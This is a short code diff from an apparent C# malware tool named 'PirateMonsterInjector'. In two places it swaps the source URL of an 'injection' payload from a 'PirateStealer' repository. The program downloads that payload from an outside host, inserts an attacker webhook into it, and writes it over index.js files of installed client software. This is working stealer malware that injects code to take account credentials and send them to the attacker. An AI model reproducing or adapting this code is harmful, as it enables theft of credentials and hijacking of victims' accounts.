@@ -211,7 +211,7 @@ namespace PirateMonsterInjector
                                                 {
                                                     if (item7.Contains("index.js"))
                                                     {
-                                                        File.WriteAllText(item7, new WebClient().DownloadString("https://raw.githubusercontent.com/Stanley-GF/PirateStealer/main/src/Injection/injection").Replace("%WEBHOOK_LINK%", Settings.Webhook));
+                                                        File.WriteAllText(item7, new WebClient().DownloadString("https://raw.githubusercontent.com/StampyGumball/pirate-stealer-by-bytixo/main/src/Injection/injection").Replace("%WEBHOOK_LINK%", Settings.Webhook));
 
                                                     }
 
@@ -262,7 +262,7 @@ namespace PirateMonsterInjector
                                                 {
                                                     if (item7.Contains("index.js"))
                                                     {
-                                                        File.WriteAllText(item7, new WebClient().DownloadString("https://raw.githubusercontent.com/Stanley-GF/PirateStealer/main/src/Injection/injection").Replace("%WEBHOOK_LINK%", Settings.Webhook));
+                                                        File.WriteAllText(item7, new WebClient().DownloadString("https://raw.githubusercontent.com/StampyGumball/pirate-stealer-by-bytixo/main/src/Injection/injection").Replace("%WEBHOOK_LINK%", Settings.Webhook));
 
                                                     }
 
